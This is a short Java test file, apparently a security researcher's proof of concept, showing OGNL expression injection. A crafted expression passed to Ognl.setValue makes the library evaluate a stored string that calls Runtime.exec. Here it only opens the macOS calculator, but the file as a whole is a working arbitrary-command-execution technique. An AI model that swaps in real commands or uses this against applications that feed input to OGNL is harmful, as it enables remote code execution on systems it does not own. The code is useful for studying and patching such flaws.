import ognl.Ognl;

import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception{
        Map<String, String> context = new HashMap();
        context.put("racerz", "@java.lang.Runtime@getRuntime().exec('open -a calculator')");
        Ognl.setValue("racer17[(racerz)(racer19)]", context, "");
    }
}
